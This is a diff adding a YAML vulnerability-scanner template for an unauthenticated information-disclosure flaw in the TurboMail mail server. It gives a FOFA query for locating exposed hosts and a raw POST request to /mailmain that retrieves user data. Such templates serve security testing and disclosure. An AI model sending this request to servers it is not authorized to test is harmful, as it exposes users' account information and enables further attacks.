@@ -1,0 +1,35 @@
+id: turbomail-disclosure
+info:
+  name: TurboMail mailmain 敏感信息泄露漏洞
+  author: leadlife
+  severity: high
+  description: TurboMail邮件系统是广州拓波软件科技有限公司研发的面向企事业单位通信需求而研发的电子邮件服务器系统。该系统mailmain接口中的pm方法存在未授权访问，未授权攻击者可利用该漏洞获取系统用户信息，可能导致进一步的攻击。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/lqgazg4ub11cfeg6
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: app="TurboMail" || body="maintlogin.jsp" || body="tmw/1/getpassword.jsp"
+    tips:
+    repair:
+    version:
+  tags: turbomail,disclosure
+
+http:
+  - raw:
+      - |
+        POST /mailmain HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 7
+
+        type=pm
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'SessinonAdmin','CachePool')
+        condition: and
